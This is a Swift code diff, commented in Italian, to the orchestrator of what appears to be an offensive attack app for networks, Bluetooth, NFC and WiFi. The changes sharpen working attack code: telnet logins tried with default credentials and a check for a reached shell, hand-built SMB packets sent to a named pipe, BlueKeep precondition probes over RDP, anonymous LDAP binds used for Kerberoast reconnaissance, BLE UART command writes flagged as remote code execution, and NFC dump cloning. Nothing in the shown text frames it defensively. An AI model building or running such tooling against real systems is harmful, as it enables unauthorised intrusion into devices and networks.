@@ -163,6 +163,19 @@ final class Orchestrator: ObservableObject {
                 DispatchQueue.main.async {
                     Task { @MainActor [weak self] in self?.addTarget(t) }
                 }
+                // friendly name SSDP: fetch ASYNC (mai sync sul main) + rename del target
+                if let desc = t.extra["desc"], let url = URL(string: desc) {
+                    URLSession.shared.dataTask(with: url) { data, _, _ in
+                        guard let data,
+                              let friendly = TargetNamer.friendlyNameFromXML(String(decoding: data, as: UTF8.self)) else { return }
+                        DispatchQueue.main.async { [weak self] in
+                            guard let self else { return }
+                            if let idx = self.targets.firstIndex(where: { $0.extra["desc"] == desc }) {
+                                self.targets[idx].name = friendly
+                            }
+                        }
+                    }.resume()
+                }
             }
             DispatchQueue.global().asyncAfter(deadline: .now() + 7) { c.resume() }
         }
@@ -218,16 +231,22 @@ final class Orchestrator: ObservableObject {
             log("port scan via bridge \(host): [\(ports.joined(separator: ","))]", ports.isEmpty ? .warn : .good)
             return (ports, banners)
         }
+        let lock = NSLock()
         var ports: [String] = []
         var banners: [String] = []
         await withCheckedContinuation { (c: CheckedContinuation<Void, Never>) in
             NetScanner.portProbe(host: host, ports: [23, 80, 161, 502, 554, 1883, 5683, 8080, 9100],
                                  timeout: 2) { port, banner in
+                lock.lock()
                 ports.append(String(port))
                 if !banner.isEmpty { banners.append("\(port): \(banner.prefix(120))") }
+                lock.unlock()
             } onDone: { c.resume() }
         }
-        return (ports, banners.joined(separator: " | "))
+        lock.lock()
+        let p = ports; let b = banners
+        lock.unlock()
+        return (p, b.joined(separator: " | "))
     }
 
     // MARK: - Matching
@@ -426,7 +445,8 @@ final class Orchestrator: ObservableObject {
             t.extra["armNote"] = "BSSID \(t.mac ?? "?") — attacco radio richiede monitor-mode esterna: args auto-configurati"
             log("wifi prep \(t.name): BSSID=\(t.mac ?? "?") sec=\(t.extra["sec"] ?? "?") — args pronti", .info)
         case .nfc:
-            if let uid = t.extra["uid"], let d = nfcDumps.first(where: { uid.hasPrefix($0.uid) }) {
+            if let uid = t.extra["uid"], !uid.isEmpty,
+               let d = nfcDumps.first(where: { !$0.uid.isEmpty && uid.hasPrefix($0.uid) }) {
                 t.extra["dump"] = d.uid
                 log("nfc prep \(t.name): dump locale (\(d.pages.count) pagine) — clone armato", .good)
             } else {
@@ -544,7 +564,7 @@ final class Orchestrator: ObservableObject {
         for (u, p) in creds {
             let r = await bridgeRT(host, 23, Data("\(u)\n\(p)\n".utf8), timeout: 4)
             if let r, let s = String(data: r, encoding: .utf8),
-               s.contains("#") || s.contains("$") || s.contains("BusyBox") || s.contains("Welcome") {
+               s.contains("BusyBox") || s.contains("Welcome") || s.lowercased().contains("uid=") || s.contains("~#") {
                 return "SUCCESS via bridge — telnet \(u):\(p) su \(host). Shell: \(s.prefix(250))"
             }
         }
@@ -564,8 +584,8 @@ final class Orchestrator: ObservableObject {
         if tcpBridge.connected {
             return await bridgeRT(host, port, payload, timeout: timeout)
         }
-        let s = await tcpRoundTrip(host: host, port: port, payload: payload, timeout: timeout)
-        return s.isEmpty ? nil : Data(s.utf8)
+        let s = await tcpRoundTripData(host: host, port: port, payload: payload, timeout: timeout)
+        return s.isEmpty ? nil : s
     }
 
     private func portOpen(_ host: String, _ port: UInt16) async -> Bool {
@@ -610,7 +630,10 @@ final class Orchestrator: ObservableObject {
                     ? "RDP 3389 risponde non-TPKT: \(String(decoding: d!.prefix(80), as: UTF8.self))"
                     : "RDP 3389: nessuna risposta"
             }
-            let protoFlag = d.count >= 11 ? d[9] : 0
+            let protoFlag: UInt8 = {
+                if let r = d.range(of: Data([0x02, 0x00, 0x08, 0x00]), in: 10..<d.count) { return d[r.lowerBound + 4] }
+                return 0
+            }()
             return "RDP APERTO su \(host):3389 — negotiate resp (proto \(String(format: "0x%02x", protoFlag)); 0x02=TLS/NLA, 0x01=standard → precondizioni BlueKeep)"
         case "os_linux_ssh":
             let d = await rawRT(host, 22, Data())
@@ -644,7 +667,7 @@ final class Orchestrator: ObservableObject {
             let b = String(decoding: d.prefix(120), as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
             for cred in [("admin", "admin"), ("root", "root"), ("admin", ""), ("root", "alpine")] {
                 let d2 = await rawRT(host, 23, Data("\r\n\(cred.0)\r\n\(cred.1)\r\nid\r\n".utf8), timeout: 4)
-                if let d2, let s2 = String(data: d2, encoding: .utf8)?.lowercased(), s2.contains("uid=") || s2.contains("$") || s2.contains("#") {
+                if let d2, let s2 = String(data: d2, encoding: .utf8)?.lowercased(), s2.contains("uid=") {
                     return "TELNET APERTO (\(b.prefix(60))) — LOGIN ACCEPTED \(cred.0):\(cred.1) → shell raggiunta (RCE)"
                 }
             }
@@ -676,10 +699,15 @@ final class Orchestrator: ObservableObject {
             let bind = Data([0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00])
             let d = await rawRT(host, 389, bind)
             guard let d, d.count >= 10 else { return "ldap 389: nessuna risposta" }
-            // bindResponse tag 0x61
-            return d[0] == 0x61
-                ? (d[d.count - 2] == 0 ? "LDAP ANON BIND SUCCESS su \(host) — enum subtree aperta (utenti/gruppi → Kerberoast recon)" : "LDAP bind resp error code \(d[d.count - 2])")
-                : "389 risponde non-LDAP"
+            // bindResponse può arrivare raw (0x61) o wrapped in LDAPMessage (0x30)
+            guard d[0] == 0x61 || d[0] == 0x30 else { return "389 risponde non-LDAP" }
+            if let r = d.range(of: Data([0x02, 0x01]), in: 1..<d.count) {
+                let code = d[r.upperBound]
+                return code == 0
+                    ? "LDAP ANON BIND SUCCESS su \(host) — enum subtree aperta (utenti/gruppi → Kerberoast recon)"
+                    : "LDAP bind resp error code \(code)"
+            }
+            return "389 bind resp non decodificabile: \(d.prefix(12).map { String(format: "%02x", $0) }.joined())"
         case "os_mac_afp":
             return await portOpen(host, 548)
                 ? "AFP 548 APERTO su \(host) — file sharing attivo (check guest)"
@@ -753,8 +781,8 @@ final class Orchestrator: ObservableObject {
         let acc = Data("\\\u{00}Windows 2000 2195\u{00}Windows 2000 5.0\u{00}".utf8)
         sess += withUnsafeBytes(of: UInt16(1 + acc.count).littleEndian) { Data($0) } // ByteCount
         sess += Data([0x00]) + acc
-        let nl1 = sess.count - 4
-        sess.insert(contentsOf: [0x00, UInt8(nl1 >> 8), UInt8(nl1 & 0xff)], at: 0) // NBSS len BE
+        let nl1 = sess.count
+        sess.insert(contentsOf: [0x00, 0x00, UInt8(nl1 >> 8), UInt8(nl1 & 0xff)], at: 0) // NBSS 4B: type + len 24-bit BE
         // TREE_CONNECT_ANDX \\host\IPC$
         var tree = smbHeader(0x75, flags2: 0xc807, uid: 0)
         tree += [0x0e,                                  // WordCount 14
@@ -766,8 +794,8 @@ final class Orchestrator: ObservableObject {
         let bcc = UInt16(1 + trail.count)
         tree += withUnsafeBytes(of: bcc.littleEndian) { Data($0) }
         tree += Data([0x00]) + trail
-        let nl2 = tree.count - 4
-        tree.insert(contentsOf: [0x00, UInt8(nl2 >> 8), UInt8(nl2 & 0xff)], at: 0)
+        let nl2 = tree.count
+        tree.insert(contentsOf: [0x00, 0x00, UInt8(nl2 >> 8), UInt8(nl2 & 0xff)], at: 0)
         // TRANS PeekNamedPipe FID 0, \PIPE\
         var trans = smbHeader(0x25, flags2: 0x2801, tid: 0, uid: 0)
         trans += [0x10,                                 // WordCount 16
@@ -789,8 +817,8 @@ final class Orchestrator: ObservableObject {
         let pipe = Data("\\PIPE\\\u{00}".utf8)
         trans += withUnsafeBytes(of: UInt16(pipe.count).littleEndian) { Data($0) }
         trans += pipe
-        let nl3 = trans.count - 4
-        trans.insert(contentsOf: [0x00, UInt8(nl3 >> 8), UInt8(nl3 & 0xff)], at: 0)
+        let nl3 = trans.count
+        trans.insert(contentsOf: [0x00, 0x00, UInt8(nl3 >> 8), UInt8(nl3 & 0xff)], at: 0)
 
         func patch(_ src: Data, _ range: Range<Int>, _ val: Data) -> Data {
             var d = src; d.replaceSubrange(range, with: val); return d
@@ -900,7 +928,10 @@ final class Orchestrator: ObservableObject {
 
     func loadDumps() {
         guard let files = try? FileManager.default.contentsOfDirectory(at: dumpsDir, includingPropertiesForKeys: nil) else { return }
-        nfcDumps = files.compactMap { try? JSONDecoder().decode(NFCDump.self, from: try! Data(contentsOf: $0)) }
+        nfcDumps = files.compactMap { f in
+            guard let data = try? Data(contentsOf: f) else { return nil }
+            return try? JSONDecoder().decode(NFCDump.self, from: data)
+        }
     }
 
     func replayDump(_ d: NFCDump) {
@@ -941,11 +972,12 @@ final class Orchestrator: ObservableObject {
         let bssid = target?.mac ?? "00:11:22:33:44:55"
         let host = target?.extra["host"] ?? "192.168.1.1"
         let iface = "wlan0"
+        let ch = target?.extra["ch"].flatMap { Int($0).map(String.init) } ?? "6"
         let h = hint
             .replacingOccurrences(of: "<BSSID>", with: bssid)
             .replacingOccurrences(of: "<HOST>", with: host)
             .replacingOccurrences(of: "<IFACE>", with: iface)
-            .replacingOccurrences(of: "<CH>", with: "6")
+            .replacingOccurrences(of: "<CH>", with: ch)
             .replacingOccurrences(of: "<CLIENT>", with: "ff:ff:ff:ff:ff:ff")
         return h.split(separator: " ").map(String.init)
     }
@@ -1015,14 +1047,14 @@ final class Orchestrator: ObservableObject {
                 if s.contains("6E400001") || c.contains("6E400002") {
                     let r = await ble.write(t, service: w.svc, characteristic: w.chr, payload: Data("id\n".utf8))
                     lines.append("Nordic UART RX (\(c.prefix(8))): write 'id' → \(r)")
-                    if r.lowercased().contains("writ") || r.contains("✓") { rce = true }
+                    if r.lowercased().contains("uid=") { rce = true }
                 } else if s.contains("8EC90001") || s.contains("FE59") || c.contains("8EC90003") {
                     lines.append("DFU/SMP (\(s.prefix(8))): char firmware-upload APERTA → flash arbitraria = RCE totale (serve .bin completo)")
                     rce = true
-                } else if s.contains("FF") || s.contains("F0") || s.contains("C3") {
+                } else if s.contains("0000FF") || s.contains("-FFE") || s.contains("-FFF") || c.contains("0000FF") {
                     let r = await ble.write(t, service: w.svc, characteristic: w.chr, payload: Data("AT\r\n".utf8))
                     lines.append("AT probe (\(c.prefix(8))): \(r)")
-                    if r.lowercased().contains("writ") || r.contains("✓") { rce = true }
+                    if r.contains("OK") { rce = true }
                 } else {
                     lines.append("chr vendor \(c.prefix(8)): fuori firma — payload manuale dal detail")
                 }
@@ -1161,7 +1193,7 @@ final class Orchestrator: ObservableObject {
             let banner = await tcpRoundTrip(host: host, port: 23, payload: Data(), timeout: 2, maxRecv: 1)
             let attempt = "\(u)\n\(p)\n".data(using: .ascii)!
             let r = await tcpRoundTrip(host: host, port: 23, payload: attempt, timeout: 3, maxRecv: 3, delaySend: 0.8)
-            if r.contains("#") || r.contains("$") || r.contains("BusyBox") || r.contains("Welcome") {
+            if r.contains("BusyBox") || r.contains("Welcome") || r.lowercased().contains("uid=") || r.contains("~#") {
                 return "SUCCESS — telnet \(u):\(p) su \(host). Banner: \(banner.prefix(100))\nShell prompt: \(r.prefix(300))"
             }
         }
@@ -1188,6 +1220,14 @@ final class Orchestrator: ObservableObject {
 
     private func tcpRoundTrip(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                               maxRecv: Int = 3, delaySend: TimeInterval = 0) async -> String {
+        let d = await tcpRoundTripData(host: host, port: port, payload: payload, timeout: timeout,
+                                       maxRecv: maxRecv, delaySend: delaySend)
+        return String(data: d, encoding: .isoLatin1) ?? d.hexPreview
+    }
+
+    // variante Data: i protocolli binari (SMB/ADB/MQTT) non passano da string re-encode
+    private func tcpRoundTripData(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
+                                  maxRecv: Int = 3, delaySend: TimeInterval = 0) async -> Data {
         await withCheckedContinuation { c in
             NetIO.tcpSendRecv(host: host, port: port, payload: payload, timeout: timeout,
                               maxRecv: maxRecv, delaySend: delaySend) { c.resume(returning: $0) }
@@ -1272,7 +1312,8 @@ final class TCPSession {
 
     private func flushFrame() {
         guard buf.count >= 4 else { return }
-        let len = Int(buf[2]) << 8 | Int(buf[3])
+        // NBSS 4 byte: [type][len 24-bit BE] — parse completo
+        let len = Int(buf[1]) << 16 | Int(buf[2]) << 8 | Int(buf[3])
         guard buf.count >= 4 + len, buf[0] == 0x00 else { return }
         let f = Data(buf.prefix(4 + len))
         buf.removeFirst(4 + len)
@@ -1287,15 +1328,24 @@ final class TCPSession {
 
 enum NetIO {
     static func tcpSendRecv(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
-                            maxRecv: Int, delaySend: TimeInterval, onResult: @escaping (String) -> Void) {
+                            maxRecv: Int, delaySend: TimeInterval, onResult: @escaping (Data) -> Void) {
         guard let p = NWEndpoint.Port(rawValue: port) else { onResult(""); return }
         let c = NWConnection(host: NWEndpoint.Host(host), port: p, using: .tcp)
-        var out = Data()
+        // done/out condivisi tra NW queue e timer → tutto dietro lock (no double-finish)
+        let lock = NSLock()
         var done = false
+        var out = Data()
         var recvCount = 0
+        func snapshot() -> Data {
+            lock.lock(); defer { lock.unlock() }
+            return out
+        }
         let finish: (String) -> Void = {
-            guard !done else { return }
-            done = true
+            lock.lock()
+            let first = !done
+            if first { done = true }
+            lock.unlock()
+            guard first else { return }
             c.cancel()
             onResult($0)
         }
@@ -1310,22 +1360,29 @@ enum NetIO {
                     sendBlock()
                 }
                 pump()
-            case .failed, .cancelled, .waiting: finish(String(data: out, encoding: .isoLatin1) ?? out.hexPreview)
+            case .failed, .cancelled:
+                finish(snapshot())
             default: break
             }
         }
         func pump() {
-            guard !done else { return }
-            c.receive(minimumIncompleteLength: 1, maximumLength: 8192) { d, _, _, _ in
+            lock.lock()
+            let finished = done
+            lock.unlock()
+            guard !finished else { return }
+            c.receive(minimumIncompleteLength: 1, maximumLength: 8192) { d, _, isComplete, err in
+                lock.lock()
                 if let d = d, !d.isEmpty {
                     out += d
                     recvCount += 1
-                    if recvCount < maxRecv { pump(); return }
                 }
-                finish(String(data: out, encoding: .isoLatin1) ?? out.hexPreview)
+                let stop = recvCount >= maxRecv
+                lock.unlock()
+                if stop || isComplete || err != nil { finish(snapshot()); return }
+                pump()
             }
         }
         c.start(queue: .global(qos: .utility))
-        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { finish(String(data: out, encoding: .isoLatin1) ?? out.hexPreview) }
+        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { finish(snapshot()) }
     }
 }
